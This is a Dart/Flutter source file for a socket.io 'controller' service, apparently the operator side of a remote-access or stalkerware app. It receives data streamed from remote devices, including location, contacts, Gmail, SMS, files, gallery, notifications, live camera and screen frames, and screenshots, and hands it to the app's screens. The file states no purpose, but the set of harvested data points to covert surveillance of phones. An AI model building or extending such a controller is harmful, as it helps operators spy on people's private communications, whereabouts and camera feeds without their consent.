import 'dart:typed_data';

import 'package:flutter/material.dart';
import 'package:socket_io_client/socket_io_client.dart' as io;

import 'package:genetic_app/models/device_model.dart';

/// Callback signature for generic JSON event data.
typedef SocketEventCallback = void Function(Map<String, dynamic> data);

/// Callback signature for binary frame data (camera / screen share).
typedef SocketFrameCallback = void Function(Uint8List frame);

class SocketService extends ChangeNotifier {
  io.Socket? _socket;

  bool _isConnected = false;
  List<DeviceModel> _devices = [];

  // ---------------------------------------------------------------------------
  // Public getters
  // ---------------------------------------------------------------------------

  bool get isConnected => _isConnected;
  List<DeviceModel> get devices => List.unmodifiable(_devices);
  io.Socket? get socket => _socket;

  // ---------------------------------------------------------------------------
  // Event callback registries
  //
  // Screens register callbacks so they can react to incoming socket events
  // without directly coupling to the socket instance.
  // ---------------------------------------------------------------------------

  final Map<String, List<SocketEventCallback>> _eventCallbacks = {};
  final Map<String, List<SocketFrameCallback>> _frameCallbacks = {};

  /// Register a callback for a JSON-based event.
  void on(String event, SocketEventCallback callback) {
    _eventCallbacks.putIfAbsent(event, () => []).add(callback);
  }

  /// Remove a previously registered JSON-event callback.
  void off(String event, SocketEventCallback callback) {
    _eventCallbacks[event]?.remove(callback);
  }

  /// Register a callback for a binary frame event (camera:frame, screen:frame).
  void onFrame(String event, SocketFrameCallback callback) {
    _frameCallbacks.putIfAbsent(event, () => []).add(callback);
  }

  /// Remove a previously registered frame callback.
  void offFrame(String event, SocketFrameCallback callback) {
    _frameCallbacks[event]?.remove(callback);
  }

  // ---------------------------------------------------------------------------
  // Connection lifecycle
  // ---------------------------------------------------------------------------

  /// Connect to the socket.io server and join as a controller.
  void connect(String serverUrl, String token) {
    if (_socket != null) {
      disconnect();
    }

    _socket = io.io(
      serverUrl,
      io.OptionBuilder()
          .setTransports(['websocket'])
          .setExtraHeaders({'x-auth-token': token})
          .setQuery({'token': token})
          .enableAutoConnect()
          .enableReconnection()
          .build(),
    );

    _socket!.onConnect((_) {
      _isConnected = true;
      _socket!.emit('controller:join');
      notifyListeners();
    });

    _socket!.onDisconnect((_) {
      _isConnected = false;
      notifyListeners();
    });

    _socket!.onReconnect((_) {
      _isConnected = true;
      _socket!.emit('controller:join');
      notifyListeners();
    });

    _socket!.onConnectError((error) {
      debugPrint('SocketService connect error: $error');
      _isConnected = false;
      notifyListeners();
    });

    // -- Register all event listeners ----------------------------------------
    _registerDeviceListeners();
    _registerDataListeners();
    _registerStreamListeners();
    _registerAuthListeners();
  }

  /// Gracefully disconnect and clean up.
  void disconnect() {
    _socket?.clearListeners();
    _socket?.disconnect();
    _socket?.dispose();
    _socket = null;
    _isConnected = false;
    _devices = [];
    notifyListeners();
  }

  /// Emit an event through the underlying socket.
  void emit(String event, [dynamic data]) {
    _socket?.emit(event, data);
  }

  // ---------------------------------------------------------------------------
  // Private listener registration
  // ---------------------------------------------------------------------------

  void _registerDeviceListeners() {
    _socket!.on('devices:update', (data) {
      if (data is List) {
        _devices = data
            .map((d) => DeviceModel.fromJson(d as Map<String, dynamic>))
            .toList();
      } else if (data is Map<String, dynamic>) {
        final list = data['devices'];
        if (list is List) {
          _devices = list
              .map((d) => DeviceModel.fromJson(d as Map<String, dynamic>))
              .toList();
        }
      }
      notifyListeners();
      _dispatch('devices:update', data);
    });
  }

  void _registerDataListeners() {
    const dataEvents = [
      'device:location',
      'device:contacts',
      'device:gmail',
      'device:phone',
      'device:files',
      'device:gallery',
      'device:notif',
      'notif:list',
      'sms:list',
    ];

    for (final event in dataEvents) {
      _socket!.on(event, (data) {
        _dispatch(event, data);
      });
    }
  }

  void _registerStreamListeners() {
    const frameEvents = [
      'camera:frame',
      'screen:frame',
      'camera:screenshot',
    ];

    for (final event in frameEvents) {
      _socket!.on(event, (data) {
        Uint8List? bytes;
        if (data is Uint8List) {
          bytes = data;
        } else if (data is List<int>) {
          bytes = Uint8List.fromList(data);
        } else if (data is Map && data['data'] != null) {
          final raw = data['data'];
          if (raw is Uint8List) {
            bytes = raw;
          } else if (raw is List<int>) {
            bytes = Uint8List.fromList(raw);
          }
        }

        if (bytes != null) {
          _dispatchFrame(event, bytes);
        }

        // Also dispatch as a regular event for metadata.
        if (data is Map<String, dynamic>) {
          _dispatch(event, data);
        }
      });
    }
  }

  void _registerAuthListeners() {
    _socket!.on('auth:error', (data) {
      debugPrint('SocketService auth:error: $data');
      _dispatch('auth:error', data);
    });
  }

  // ---------------------------------------------------------------------------
  // Internal dispatch helpers
  // ---------------------------------------------------------------------------

  void _dispatch(String event, dynamic data) {
    final callbacks = _eventCallbacks[event];
    if (callbacks == null || callbacks.isEmpty) return;

    Map<String, dynamic> payload;
    if (data is Map<String, dynamic>) {
      payload = data;
    } else if (data is Map) {
      payload = Map<String, dynamic>.from(data);
    } else {
      payload = {'data': data};
    }

    for (final cb in List<SocketEventCallback>.from(callbacks)) {
      try {
        cb(payload);
      } catch (e) {
        debugPrint('SocketService dispatch error ($event): $e');
      }
    }
  }

  void _dispatchFrame(String event, Uint8List frame) {
    final callbacks = _frameCallbacks[event];
    if (callbacks == null || callbacks.isEmpty) return;

    for (final cb in List<SocketFrameCallback>.from(callbacks)) {
      try {
        cb(frame);
      } catch (e) {
        debugPrint('SocketService frame dispatch error ($event): $e');
      }
    }
  }

  // ---------------------------------------------------------------------------
  // Cleanup
  // ---------------------------------------------------------------------------

  @override
  void dispose() {
    disconnect();
    _eventCallbacks.clear();
    _frameCallbacks.clear();
    super.dispose();
  }
}
